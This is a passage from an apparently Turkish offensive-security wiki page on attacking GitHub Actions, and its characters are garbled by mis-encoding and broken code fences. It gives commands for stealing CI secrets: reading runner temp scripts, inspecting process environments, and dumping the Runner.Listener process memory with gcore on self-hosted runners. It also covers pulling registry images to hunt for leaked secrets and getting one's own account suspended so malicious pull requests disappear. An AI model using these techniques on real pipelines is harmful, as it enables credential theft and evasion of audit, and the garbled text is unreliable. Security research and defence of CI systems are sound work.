* EÄŸer secret **doÄŸrudan bir ifadede** kullanÄ±lÄ±yorsa, oluÅŸturulan shell betiÄŸi **diskte** saklanÄ±r ve eriÅŸilebilir.
* ```bash
  ```

cat /home/runner/work/\_temp/\*

````
* Bir JavaScript eylemi iÃ§in secrets, Ã§evresel deÄŸiÅŸkenler aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilir
* ```bash
ps axe | grep node
````

* **Ã–zel bir eylem** iÃ§in, programÄ±n aldÄ±ÄŸÄ± secret'i nasÄ±l kullandÄ±ÄŸÄ±na baÄŸlÄ± olarak risk deÄŸiÅŸebilir:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Kendi barÄ±ndÄ±ran Ã§alÄ±ÅŸtÄ±rÄ±cÄ±larÄ± KÃ¶tÃ¼ye Kullanma

**Github Eylemlerinin Github dÄ±ÅŸÄ± altyapÄ±da yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼ nasÄ±l bulunacaÄŸÄ±** aranarak **`runs-on: self-hosted`** ifadesi Github Eylemi yapÄ±landÄ±rma yaml'Ä±nda aranabilir.

**Kendi barÄ±ndÄ±ran** Ã§alÄ±ÅŸtÄ±rÄ±cÄ±lara ekstra hassas bilgilere, diÄŸer **aÄŸ sistemlerine** (aÄŸdaki savunmasÄ±z uÃ§ noktalar mÄ±? meta veri servisi mi?) eriÅŸim olabilir veya, izole edilmiÅŸ ve yok edilmiÅŸ olsa bile, **aynÄ± anda birden fazla eylem Ã§alÄ±ÅŸtÄ±rÄ±labilir** ve kÃ¶tÃ¼ niyetli olan diÄŸerinin diÄŸerinin **secrets'larÄ±nÄ± Ã§alabilir**.

Kendi barÄ±ndÄ±ran Ã§alÄ±ÅŸtÄ±rÄ±cÄ±larda, \_Runner.Listener\*\*\_\*\* iÅŸleminden secrets'larÄ± elde etmek de mÃ¼mkÃ¼ndÃ¼r\*\* ve bu iÅŸlem, belleÄŸini dÃ¶kerek herhangi bir adÄ±mda iÅŸ akÄ±ÅŸlarÄ±nÄ±n tÃ¼m secrets'larÄ±nÄ± iÃ§erecektir:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Daha fazla bilgi iÃ§in [**bu gÃ¶nderiye**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/) bakÄ±n.

### Github Docker GÃ¶rÃ¼ntÃ¼leri KayÄ±t Defteri

Github iÃ§inde **bir Docker gÃ¶rÃ¼ntÃ¼sÃ¼ oluÅŸturup depolayan Github eylemleri** yapmak mÃ¼mkÃ¼ndÃ¼r.\
Bir Ã¶rnek aÅŸaÄŸÄ±daki geniÅŸletilebilir bÃ¶lÃ¼mde bulunabilir:

<details>

<summary>Github Eylemi OluÅŸtur &#x26; Docker GÃ¶rÃ¼ntÃ¼sÃ¼ YÃ¼kle</summary>

\`\`\`yaml \[...]

* name: Set up Docker Buildx uses: docker/setup-buildx-action@v1
* name: Login to GitHub Container Registry uses: docker/login-action@v1 with: registry: ghcr.io username: $\{{ github.repository\_owner \}} password: $\{{ secrets.ACTIONS\_TOKEN \}}
* name: Add Github Token to Dockerfile to be able to download code run: | sed -i -e 's/TOKEN=##VALUE##/TOKEN=$\{{ secrets.ACTIONS\_TOKEN \}}/g' Dockerfile
* name: Build and push uses: docker/build-push-action@v2 with: context: . push: true tags: | ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:latest ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:$\{{ env.GITHUB\_NEWXREF \}}-$\{{ github.sha \}}

\[...]

````
</details>

Ã–nceki kodda gÃ¶rebileceÄŸiniz gibi, Github kayÄ±t defteri **`ghcr.io`** Ã¼zerinde barÄ±ndÄ±rÄ±lmaktadÄ±r.

Daha sonra depo Ã¼zerinde okuma izinlerine sahip bir kullanÄ±cÄ±, bir kiÅŸisel eriÅŸim belirteci kullanarak Docker Ä°majÄ±nÄ± indirebilecektir:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
````

Sonra, kullanÄ±cÄ± **Docker imaj katmanlarÄ±nda sÄ±zdÄ±rÄ±lmÄ±ÅŸ sÄ±rlarÄ±** arayabilir:

#### Github Actions gÃ¼nlÃ¼klerinde Hassas Bilgiler

**Github**, eylemler gÃ¼nlÃ¼klerinde **gizli deÄŸerleri tespit etmeye** ve **gÃ¶stermemeye Ã§alÄ±ÅŸsa da**, eylemin yÃ¼rÃ¼tÃ¼lmesi sÄ±rasÄ±nda Ã¼retilmiÅŸ **diÄŸer hassas veriler** gizlenmeyecektir. Ã–rneÄŸin, bir gizli deÄŸerle imzalanmÄ±ÅŸ bir JWT gizlenmeyecektir, [Ã¶zel olarak yapÄ±landÄ±rÄ±lmadÄ±kÃ§a](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

### Ä°zlerinizi Gizleme

(Teknik [**buradan**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Ä°lk olarak, herhangi bir PR'nin Github'da ve hedef GitHub hesabÄ±nda halka aÃ§Ä±k olarak gÃ¶rÃ¼lebilir olduÄŸunu belirtmek gerekir. GitHub'ta varsayÄ±lan olarak, **bir PR'yi internetten silemeyiz**, ancak bir hile var. Github tarafÄ±ndan **askÄ±ya alÄ±nan** hesaplar iÃ§in, tÃ¼m **PR'ler otomatik olarak silinir** ve internetten kaldÄ±rÄ±lÄ±r. DolayÄ±sÄ±yla etkinliÄŸinizi gizlemek iÃ§in ya **GitHub hesabÄ±nÄ±zÄ±n askÄ±ya alÄ±nmasÄ±nÄ± ya da hesabÄ±nÄ±zÄ±n iÅŸaretlenmesini** saÄŸlamanÄ±z gerekir. Bu, GitHub'daki tÃ¼m etkinliklerinizi internetten gizler (temelde tÃ¼m hile PR'lerinizi kaldÄ±rÄ±r).

GitHub'ta bir organizasyon, hesaplarÄ± GitHub'a bildirme konusunda Ã§ok proaktiftir. YapmanÄ±z gereken tek ÅŸey, Issue'da "bazÄ± ÅŸeyler" paylaÅŸmak ve hesabÄ±nÄ±zÄ±n 12 saat iÃ§inde askÄ±ya alÄ±nmasÄ±nÄ± saÄŸlamalarÄ±nÄ± saÄŸlamaktÄ±r :p ve iÅŸte burada, hilenizi GitHub'ta gÃ¶rÃ¼nmez hale getirdiniz.

Hedef alÄ±ndÄ±klarÄ±nÄ± anlamak iÃ§in bir organizasyonun yapabileceÄŸi tek ÅŸey, GitHub UI'dan PR'nin kaldÄ±rÄ±ldÄ±ÄŸÄ±ndan emin olmak iÃ§in SIEM'den GitHub gÃ¼nlÃ¼klerini kontrol etmektir.

### AraÃ§lar

AÅŸaÄŸÄ±daki araÃ§lar Github Eylem iÅŸ akÄ±ÅŸlarÄ±nÄ± bulmak ve hatta zayÄ±f olanlarÄ± bulmak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

</details>
